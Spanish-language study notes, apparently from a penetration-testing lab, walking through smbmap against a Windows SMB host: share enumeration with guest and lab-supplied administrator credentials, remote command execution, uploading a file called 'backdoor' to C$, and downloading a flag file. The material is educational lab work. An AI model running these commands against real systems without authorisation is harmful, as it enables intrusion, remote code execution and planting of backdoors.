Es una herramienta que nos permite enumerar recursos, descargar y subir archivos, con unos credenciales
Mas Ejemplos: #EnumSMB_smbmap 
#### Ejemplo
---
##### Fase de reconocimiento

La version de samba con la que vamos a trabajar es v1, por ello podemos hacer con el usuario guest
![[Pasted image 20231114192848.png]]

Obtenemos un Listado de directorios desde la raiz ".\\"
```bash
smbmap -u guest -p "" -d . -H 10.2.28.124
```
- `-u`: usuario
- `-p`: password
- `-d`: Nombre de dominio, por defecto: (WORKGROUP)
- `-H`: Host
![[Pasted image 20231114193653.png]]

ahora probamos el mismo comando pero con los credenciales que nos ofrecen en el ejercicio
```bash
smbmap -u administrator -p "smbserver_771" -d . -H 10.2.22.113
```
![[Pasted image 20231115101119.png]]
ahora tenemos mas permisos como podemos observar.

[[smbmap]] nos permite ejecutar comandos desde samba vamos probar a hacer un `ipconfig` de forma remota (ipconfig ya que sabes que estamos atacando una maquina windows)
```bash
smbmap -u administrator -p "smbserver_771" -d C -H 10.2.22.113 -x 'ipconfig'
```
![[Pasted image 20231115101420.png]]
vemos que la ip coincide tal y como esperábamos

otro script nos muestra los recursos compartidos disponibles, pero en este caso no nos devuelve un resultado.
```bash
smbmap -u administrator -p "smbserver_771" -d . -H 10.2.22.113 -L
```
![[Pasted image 20231115101738.png]]

Tambien podemos hacer uso de -r para listar los recursos pero esta vez de forma recursiva 
```bash
smbmap -u administrator -p "smbserver_771" -d . -H 10.2.22.113 -r
```
![[Pasted image 20231115101930.png]]

si queremos hacerlo de de forma mas localizada podemos establer la unidad en este caso `C$`
```bash
smbmap -u administrator -p "smbserver_771" -d . -H 10.2.22.113 -r 'C$'
```
![[Pasted image 20231115102303.png]]
##### Fase de explotación
[[smbmap]] permite la subida de archivos, como tentemos credenciales con permisos de escritura, vamos a hacer uso de ello.

Creamos un archivo en nuestra maquina llamado "backdoor" y lo subimos
```bash
smbmap -u administrator -p "smbserver_771" -d . -H 10.2.22.113 --upload "./backdoor" 'C$/backdoor'
```
podemos comprobar que se ha subido usando el comando de antes `-r 'C$'`
![[Pasted image 20231115102854.png]]

También podemos bajar archivos, este caso bajaremos el archivo "Flag.txt"
![[Pasted image 20231115103008.png]]
con el comando
```bash
smbmap -u administrator -p "smbserver_771" -d . -H 10.2.22.113 --download "C$/flag.txt"
```
![[Pasted image 20231115103244.png]]
